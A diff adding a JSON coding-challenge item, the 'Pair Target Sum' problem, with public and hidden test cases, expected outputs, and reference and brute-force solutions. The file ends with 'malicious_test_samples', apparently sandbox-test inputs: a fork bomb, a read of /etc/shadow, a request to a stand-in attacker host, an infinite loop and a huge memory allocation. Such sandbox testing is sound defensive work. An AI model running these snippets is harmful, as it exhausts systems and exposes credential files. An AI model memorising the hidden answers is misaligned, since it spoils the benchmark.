@@ -1,0 +1,97 @@
+{
+  "question_id": "q_target_pair_001",
+  "title": "Pair Target Sum",
+  "difficulty": "Medium",
+  "domain": "Algorithms / Data Structures",
+  "description": "Given an array of integers `nums` and an integer `target`, find and return the 0-based indices of the two distinct elements such that they add up to `target`. You may assume that each input has exactly one valid solution, and you may not use the same element twice. Return the indices sorted in ascending order.",
+  "input_format": "Line 1: Comma-separated integers representing `nums`.\nLine 2: Single integer representing `target`.",
+  "output_format": "Two space-separated integers representing the sorted 0-based indices.",
+  "constraints": {
+    "min_array_length": 2,
+    "max_array_length": 100000,
+    "min_value": -1000000000,
+    "max_value": 1000000000,
+    "time_limit_ms": 2000,
+    "memory_limit_mb": 256
+  },
+  "public_test_cases": [
+    {
+      "test_case_id": "pub_01",
+      "input": "2,7,11,15\n9",
+      "expected_output": "0 1",
+      "explanation": "nums[0] + nums[1] == 2 + 7 == 9, so indices 0 and 1 are returned."
+    },
+    {
+      "test_case_id": "pub_02",
+      "input": "3,2,4\n6",
+      "expected_output": "1 2",
+      "explanation": "nums[1] + nums[2] == 2 + 4 == 6."
+    }
+  ],
+  "hidden_test_cases": [
+    {
+      "test_case_id": "hid_01_negatives",
+      "input": "-1,-2,-3,-4,-5\n-8",
+      "expected_output": "2 4",
+      "weight": 20
+    },
+    {
+      "test_case_id": "hid_02_zeros",
+      "input": "0,4,3,0\n0",
+      "expected_output": "0 3",
+      "weight": 20
+    },
+    {
+      "test_case_id": "hid_03_duplicates_large",
+      "input": "1000000000,-1000000000,5,5\n10",
+      "expected_output": "2 3",
+      "weight": 20
+    },
+    {
+      "test_case_id": "hid_04_distant_pair",
+      "input": "1,99,50,40,30,20,10,2\n3",
+      "expected_output": "0 7",
+      "weight": 20
+    },
+    {
+      "test_case_id": "hid_05_large_elements",
+      "input": "500000000,500000000\n1000000000",
+      "expected_output": "0 1",
+      "weight": 20
+    }
+  ],
+  "reference_solution": {
+    "language": "python",
+    "code": "import sys\n\ndef solve():\n    lines = sys.stdin.read().strip().split('\\n')\n    if not lines or len(lines) < 2:\n        return\n    nums = [int(x.strip()) for x in lines[0].split(',')]\n    target = int(lines[1].strip())\n    \n    seen = {}\n    for i, num in enumerate(nums):\n        complement = target - num\n        if complement in seen:\n            first, second = sorted([seen[complement], i])\n            print(f\"{first} {second}\")\n            return\n        seen[num] = i\n\nif __name__ == '__main__':\n    solve()\n",
+    "expected_time_complexity": "O(N)",
+    "expected_space_complexity": "O(N)"
+  },
+  "suboptimal_solution": {
+    "language": "python",
+    "code": "import sys\n\ndef solve():\n    lines = sys.stdin.read().strip().split('\\n')\n    nums = [int(x.strip()) for x in lines[0].split(',')]\n    target = int(lines[1].strip())\n    n = len(nums)\n    for i in range(n):\n        for j in range(i + 1, n):\n            if nums[i] + nums[j] == target:\n                print(f\"{i} {j}\")\n                return\n\nif __name__ == '__main__':\n    solve()\n",
+    "expected_time_complexity": "O(N^2)",
+    "expected_space_complexity": "O(1)"
+  },
+  "malicious_test_samples": [
+    {
+      "name": "fork_bomb_attempt",
+      "code": "import os\nwhile True:\n    try:\n        os.fork()\n    except Exception:\n        pass"
+    },
+    {
+      "name": "file_system_escape_attempt",
+      "code": "with open('/etc/shadow', 'r') as f:\n    print(f.read())"
+    },
+    {
+      "name": "network_exfiltration_attempt",
+      "code": "import urllib.request\nurllib.request.urlopen('http://malicious-site.example.com')"
+    },
+    {
+      "name": "infinite_loop_timeout",
+      "code": "while True:\n    pass"
+    },
+    {
+      "name": "memory_exhaustion_attempt",
+      "code": "arr = [0] * (10 ** 9)"
+    }
+  ]
+}
